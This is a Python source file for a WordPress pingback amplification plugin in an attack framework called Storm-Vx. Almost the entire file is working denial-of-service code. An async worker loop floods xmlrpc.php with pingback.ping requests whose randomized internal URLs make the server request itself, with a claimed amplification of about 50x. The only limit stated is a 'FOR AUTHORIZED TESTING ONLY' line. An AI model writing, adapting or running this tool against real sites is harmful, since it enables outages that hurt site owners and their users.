#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
vf_wp_pingback_amplify — WordPress Pingback Amplification Attack Plugin

Uses pingback.ping with internal URLs to make the WordPress server
send HTTP requests to itself. Each request we send causes the server
to make 1-5 requests internally — reflexive DDoS (50x).
Part of the Storm-Vx plugin architecture.

FOR AUTHORIZED TESTING ONLY!
"""

from __future__ import annotations

import asyncio
import time
import random
from typing import Dict, Any


from plugin_system import PluginMeta, AttackContext
from tester.vf_attack_base import AttackPlugin
from vf_common import C, rand_str
import aiohttp


__all__ = ["WpPingbackAmplifyPlugin"]


def _rand_internal_path() -> str:
    """Generate a random internal WordPress path.

    Returns paths that look like real WordPress URLs:
      /?p=12345
      /?page_id=67890
      /some-slug/
      /category/tech-stuff/
      /tag/random-word/
      /2024/03/hello-world/
    """
    patterns = [
        lambda: f"/?p={random.randint(1, 99999)}",
        lambda: f"/?page_id={random.randint(1, 99999)}",
        lambda: f"/{rand_str(random.randint(4, 10))}-{rand_str(random.randint(3, 7))}/",
        lambda: f"/category/{rand_str(random.randint(3, 8))}-{rand_str(4)}/",
        lambda: f"/tag/{rand_str(random.randint(3, 8))}/",
        lambda: f"/{random.randint(2018, 2025)}/{random.randint(1, 12):02d}/{rand_str(random.randint(4, 10))}-{rand_str(4)}/",
    ]
    return random.choice(patterns)()


def _build_pingback_xml(source_url: str, target_url: str) -> str:
    """Build a pingback.ping XML-RPC request body.

    Uses string concatenation for performance — no xml.etree overhead.

    Args:
        source_url: URL the server will fetch (internal — triggers self-request).
        target_url: URL the server will verify (internal — triggers self-request).

    Returns:
        Complete XML-RPC request body as a string.
    """
    return (
        '<?xml version="1.0"?>\n'
        "<methodCall>\n"
        "  <methodName>pingback.ping</methodName>\n"
        "  <params>\n"
        f"    <param><value><string>{source_url}</string></value></param>\n"
        f"    <param><value><string>{target_url}</string></value></param>\n"
        "  </params>\n"
        "</methodCall>"
    )


class WpPingbackAmplifyPlugin(AttackPlugin):
    """WordPress Pingback Amplification — reflexive DDoS via pingback.ping.

    Sends pingback.ping calls with *internal* source and target URLs.
    The WordPress server tries to fetch the source URL to verify the
    link exists, which means it makes HTTP requests back to itself.
    Each pingback request can trigger 1–5 internal HTTP requests,
    delivering ~50x amplification.
    """

    meta = PluginMeta(
        name='wp_pingback_amplify',
        version='1.0.0',
        plugin_type='attack',
        description='WordPress pingback amplification — pingback.ping with internal URLs for reflexive DDoS (50x)',
        tags=['http', 'wordpress', 'pingback', 'amplification', 'reflexive'],
        priority=23,
        compatible_profiles=[],
        requirements=['aiohttp'],
    )

    async def _worker_loop(self, context: AttackContext, worker_id: int) -> None:
        """Pingback amplification worker: reflexive HTTP via pingback.ping."""
        _ssl = context.ssl_param

        site_root = context.url
        url = site_root.rstrip("/") + "/xmlrpc.php"
        delay_ms = context.extra.delay_ms

        while not self._stop_event.is_set():
            try:
                # Generate two DIFFERENT internal paths for source & target
                source_path = _rand_internal_path()
                target_path = _rand_internal_path()
                # Ensure they differ (extremely unlikely to collide, but be safe)
                while target_path == source_path:
                    target_path = _rand_internal_path()

                source_url = site_root.rstrip("/") + source_path
                target_url = site_root.rstrip("/") + target_path

                xml_body = _build_pingback_xml(source_url, target_url)

                headers = self._get_fresh_headers(context, "document")
                headers["Content-Type"] = "text/xml"

                t = time.monotonic()
                try:
                    async with context.session.post(
                        url, headers=headers, data=xml_body,
                        ssl=_ssl, allow_redirects=False,
                    ) as resp:
                        rt = time.monotonic() - t
                        ok = resp.status < 500
                        await self._record(
                            "WP-PING", ok, resp.status, rt,
                            url=url[:60],
                            hint=f"src={source_path[:30]}",
                        )
                except asyncio.CancelledError:
                    raise
                except (aiohttp.ClientError, asyncio.TimeoutError, OSError) as exc:
                    rt = time.monotonic() - t
                    await self._record(
                        "WP-PING", False, 0, rt,
                        err=type(exc).__name__,
                        url=url[:60],
                        hint=f"src={source_path[:30]}",
                    )

                if delay_ms > 0:
                    await asyncio.sleep(delay_ms / 1000.0)

            except asyncio.CancelledError:
                return
            except (aiohttp.ClientError, asyncio.TimeoutError, OSError) as exc:
                await self._record("WP-PING", False, 0, 0,
                                   err=type(exc).__name__)
                await asyncio.sleep(0.1)

